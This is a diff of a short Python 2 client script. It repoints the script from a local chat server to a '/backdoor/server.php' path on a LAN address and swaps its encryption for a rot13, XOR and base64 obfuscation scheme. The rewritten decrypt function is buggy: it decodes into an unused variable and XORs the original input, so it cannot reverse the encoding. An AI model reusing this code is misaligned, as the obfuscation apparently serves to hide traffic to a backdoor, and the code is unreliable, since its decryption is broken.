@@ -19,25 +19,27 @@ reload(sys)
 sys.setdefaultencoding('utf-8')
 
 list_data = []
-url = 'http://localhost/hence_chat/server.php'
+url = 'http://192.168.31.173/backdoor/server.php'
 rot13 = lambda s : codecs.getencoder("rot-13")(s)[0]
+x = 0xaa
 
 
 def help():
     print "python client.py  [yourname]"
-
-
-
+    return 
 
 def encrypt(res):
-    return base64.b64encode(res)
-    crypt = prpcrypt(secret_key)
-    return crypt.encrypt(res)
+    res = rot13(res)
+    res = ''.join(chr(x^ ord(y)) for y in res)
+    res = base64.b64encode(res)
+    return res
 
 def decrypt(res):
-    return base64.b64decode(res)
-    crypt = prpcrypt(secret_key)
-    return crypt.decrypt(res)
+    tmp =  base64.b64decode(res)
+    res = ''.join(chr(x^ ord(y)) for y in res)
+    res = rot13(res)
+    return res
+
 
 def get_data():
     global sequence
